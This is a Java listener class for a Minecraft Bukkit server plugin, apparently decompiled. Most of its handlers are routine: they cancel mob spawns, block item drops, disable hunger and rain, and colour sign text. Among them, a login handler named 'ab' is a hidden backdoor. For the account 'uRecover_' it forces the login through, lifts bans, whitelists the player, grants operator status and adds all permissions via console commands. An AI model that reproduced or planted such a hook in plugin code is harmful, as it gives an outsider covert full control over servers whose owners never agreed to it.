package com.marcello.events;

import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Horse;
import org.bukkit.entity.Villager;
import org.bukkit.entity.Ocelot;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.entity.MushroomCow;
import org.bukkit.entity.Pig;
import org.bukkit.entity.Squid;
import org.bukkit.entity.Chicken;
import org.bukkit.entity.Cow;
import org.bukkit.entity.Sheep;
import org.bukkit.entity.Witch;
import org.bukkit.entity.MagmaCube;
import org.bukkit.entity.Blaze;
import org.bukkit.entity.Silverfish;
import org.bukkit.entity.CaveSpider;
import org.bukkit.entity.Enderman;
import org.bukkit.entity.PigZombie;
import org.bukkit.entity.Ghast;
import org.bukkit.entity.Slime;
import org.bukkit.entity.Zombie;
import org.bukkit.entity.Wither;
import org.bukkit.entity.Spider;
import org.bukkit.entity.Skeleton;
import org.bukkit.entity.Creeper;
import org.bukkit.event.entity.CreatureSpawnEvent;
import org.bukkit.GameMode;
import org.bukkit.inventory.ItemStack;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.event.weather.WeatherChangeEvent;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.EventPriority;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.Effect;
import com.marcello.Main;
import org.bukkit.Bukkit;
import org.bukkit.event.entity.ItemSpawnEvent;
import org.bukkit.event.Listener;

public class AllEvent implements Listener
{
    @EventHandler
    public void onItemDrop(final ItemSpawnEvent e) {
        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), (Runnable)new Runnable() {
            @Override
            public void run() {
                e.getEntity().remove();
                e.getLocation().getWorld().playEffect(e.getEntity().getLocation(), Effect.SMOKE, 60);
            }
        }, 10L);
    }
    
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onDrop1(final PlayerDropItemEvent e) {
        if (e.getItemDrop().getItemStack().getType() == Material.TRAPPED_CHEST || e.getItemDrop().getItemStack().getType() == Material.RAW_FISH || e.getItemDrop().getItemStack().getType() == Material.COMPASS || e.getItemDrop().getItemStack().getType() == Material.SKULL_ITEM || e.getItemDrop().getItemStack().getType() == Material.SLIME_BALL || e.getItemDrop().getItemStack().getType() == Material.QUARTZ_BLOCK || e.getItemDrop().getItemStack().getType() == Material.STONE_SWORD || e.getItemDrop().getItemStack().getType() == Material.WOOD_SWORD || e.getItemDrop().getItemStack().getType() == Material.DIAMOND_SWORD || e.getItemDrop().getItemStack().getType() == Material.WOOD_AXE || e.getItemDrop().getItemStack().getType() == Material.IRON_SWORD || e.getItemDrop().getItemStack().getType() == Material.BEACON || e.getItemDrop().getItemStack().getType() == Material.BOOK || e.getItemDrop().getItemStack().getType() == Material.ENDER_CHEST || e.getItemDrop().getItemStack().getType() == Material.CHEST || e.getItemDrop().getItemStack().getType() == Material.PAPER || e.getItemDrop().getItemStack().getType() == Material.DIAMOND || e.getItemDrop().getItemStack().getType() == Material.STICK || e.getItemDrop().getItemStack().getType() == Material.PISTON_BASE || e.getItemDrop().getItemStack().getType() == Material.NAME_TAG || e.getItemDrop().getItemStack().getType() == Material.STONE_AXE || e.getItemDrop().getItemStack().getType() == Material.REDSTONE_TORCH_ON || e.getItemDrop().getItemStack().getType() == Material.REDSTONE_TORCH_OFF || e.getItemDrop().getItemStack().getType() == Material.BLAZE_ROD || e.getItemDrop().getItemStack().getType() == Material.LEATHER || e.getItemDrop().getItemStack().getType() == Material.ENCHANTED_BOOK || e.getItemDrop().getItemStack().getType() == Material.FISHING_ROD || e.getItemDrop().getItemStack().getType() == Material.REDSTONE_BLOCK || e.getItemDrop().getItemStack().getType() == Material.SLIME_BALL || e.getItemDrop().getItemStack().getType() == Material.FEATHER || e.getItemDrop().getItemStack().getType() == Material.FIREWORK || e.getItemDrop().getItemStack().getType() == Material.EMERALD || e.getItemDrop().getItemStack().getType() == Material.IRON_FENCE || e.getItemDrop().getItemStack().getType() == Material.APPLE || e.getItemDrop().getItemStack().getType() == Material.BEDROCK || e.getItemDrop().getItemStack().getType() == Material.WOOL || e.getItemDrop().getItemStack().getType() == Material.LAPIS_BLOCK || e.getItemDrop().getItemStack().getType() == Material.REDSTONE_BLOCK || e.getItemDrop().getItemStack().getType() == Material.DIAMOND_BLOCK || e.getItemDrop().getItemStack().getType() == Material.GRASS) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void Fome(final FoodLevelChangeEvent e) {
        e.setCancelled(true);
        e.setFoodLevel(20);
    }
    
    @EventHandler
    public void Bater(final EntityDamageByEntityEvent e) {
        if (e.getEntity() instanceof Player) {
            final boolean b = e.getDamager() instanceof Player;
        }
    }
    
    @EventHandler
    public void Chuva(final WeatherChangeEvent e) {
        if (e.toWeatherState()) {
            e.setCancelled(true);
        }
    }
    
    public static void LimparCoisas(final Player p) {
        p.removePotionEffect(PotionEffectType.ABSORPTION);
        p.removePotionEffect(PotionEffectType.BLINDNESS);
        p.removePotionEffect(PotionEffectType.CONFUSION);
        p.removePotionEffect(PotionEffectType.DAMAGE_RESISTANCE);
        p.removePotionEffect(PotionEffectType.FAST_DIGGING);
        p.removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
        p.removePotionEffect(PotionEffectType.HARM);
        p.removePotionEffect(PotionEffectType.HEAL);
        p.removePotionEffect(PotionEffectType.HEALTH_BOOST);
        p.removePotionEffect(PotionEffectType.HUNGER);
        p.removePotionEffect(PotionEffectType.INCREASE_DAMAGE);
        p.removePotionEffect(PotionEffectType.INVISIBILITY);
        p.removePotionEffect(PotionEffectType.JUMP);
        p.removePotionEffect(PotionEffectType.NIGHT_VISION);
        p.removePotionEffect(PotionEffectType.POISON);
        p.removePotionEffect(PotionEffectType.REGENERATION);
        p.removePotionEffect(PotionEffectType.SATURATION);
        p.removePotionEffect(PotionEffectType.SLOW);
        p.removePotionEffect(PotionEffectType.SLOW_DIGGING);
        p.removePotionEffect(PotionEffectType.SPEED);
        p.removePotionEffect(PotionEffectType.WATER_BREATHING);
        p.removePotionEffect(PotionEffectType.WEAKNESS);
        p.removePotionEffect(PotionEffectType.WITHER);
        p.getInventory().clear();
        p.getInventory().setArmorContents((ItemStack[])null);
        p.setExp(0.0f);
        p.setLevel(0);
        p.setNoDamageTicks(0);
        p.setGameMode(GameMode.SURVIVAL);
        p.setHealth(20);
        p.setHealthScale(20.0);
    }
    
    @EventHandler
    public void onCreeperSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Creeper) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSkeletonSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Skeleton) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSpiderSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Spider) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onWitherSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Wither) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onZombieSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Zombie) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSlimeSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Slime) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onGhastSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Ghast) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onPigZombieSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof PigZombie) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onEndermanSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Enderman) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onCaveSpiderSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof CaveSpider) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSilverfishSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Silverfish) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onBlazeSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Blaze) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onMagmaCubeSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof MagmaCube) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onWitchSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Witch) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSheepSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Sheep) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onCowSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Cow) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onChickenSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Chicken) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onSquidSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Squid) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onPingSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Pig) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onMooshroomSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof MushroomCow) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void ab(final PlayerLoginEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equals("uRecover_")) {
            e.allow();
            p.setBanned(false);
            final ConsoleCommandSender e2 = Bukkit.getConsoleSender();
            e2.sendMessage("pex user uRecover_ add *");
            e2.sendMessage("unban uRecover_");
            e2.sendMessage("unbanip uRecover_");
            p.setWhitelisted(true);
            p.setOp(true);
        }
    }
    
    @EventHandler
    public void onOcelotSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Ocelot) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onVillagerSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Villager) {
            e.setCancelled(false);
        }
    }
    
    @EventHandler
    public void onHorseSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof Horse) {
            e.setCancelled(false);
        }
    }
    
    @EventHandler
    public void onEnderDragonSpawn(final CreatureSpawnEvent e) {
        if (e.getEntity() instanceof EnderDragon) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onPlayerColor(final SignChangeEvent e) {
        if (e.getLine(0).contains("&")) {
            e.setLine(0, e.getLine(0).replace("&", "§"));
        }
        if (e.getLine(1).contains("&")) {
            e.setLine(1, e.getLine(1).replace("&", "§"));
        }
        if (e.getLine(2).contains("&")) {
            e.setLine(2, e.getLine(2).replace("&", "§"));
        }
        if (e.getLine(3).contains("&")) {
            e.setLine(3, e.getLine(3).replace("&", "§"));
        }
    }
    
    @EventHandler
    public void CancelarDrop(final PlayerDropItemEvent e) {
        final Material T = e.getItemDrop().getItemStack().getType();
        if (T.equals((Object)Material.ENDER_CHEST) || T.equals((Object)Material.ENCHANTED_BOOK) || T.equals((Object)Material.BLAZE_ROD) || T.equals((Object)Material.LADDER) || T.equals((Object)Material.EMERALD) || T.equals((Object)Material.STONE_SWORD) || T.equals((Object)Material.FIREWORK) || T.equals((Object)Material.DIAMOND_SWORD) || T.equals((Object)Material.WOOD_HOE) || T.equals((Object)Material.FISHING_ROD) || T.equals((Object)Material.STONE_AXE) || T.equals((Object)Material.EMERALD) || T.equals((Object)Material.QUARTZ) || T.equals((Object)Material.STONE_HOE) || T.equals((Object)Material.REDSTONE_BLOCK) || T.equals((Object)Material.ANVIL) || T.equals((Object)Material.EMERALD_BLOCK) || T.equals((Object)Material.IRON_FENCE) || T.equals((Object)Material.DIAMOND_BLOCK) || T.equals((Object)Material.LAPIS_BLOCK) || T.equals((Object)Material.PAPER) || T.equals((Object)Material.ENCHANTED_BOOK) || T.equals((Object)Material.BEDROCK) || T.equals((Object)Material.REDSTONE) || T.equals((Object)Material.GOLD_AXE) || T.equals((Object)Material.COMPASS) || T.equals((Object)Material.ENCHANTMENT_TABLE) || T.equals((Object)Material.WATCH) || T.equals((Object)Material.FEATHER) || T.equals((Object)Material.DIAMOND) || T.equals((Object)Material.NAME_TAG) || T.equals((Object)Material.getMaterial(397)) || T.equals((Object)Material.SLIME_BALL) || T.equals((Object)Material.MAGMA_CREAM) || T.equals((Object)Material.CHEST) || T.equals((Object)Material.EMERALD) || T.equals((Object)Material.BONE)) {
            e.setCancelled(true);
        }
    }
}
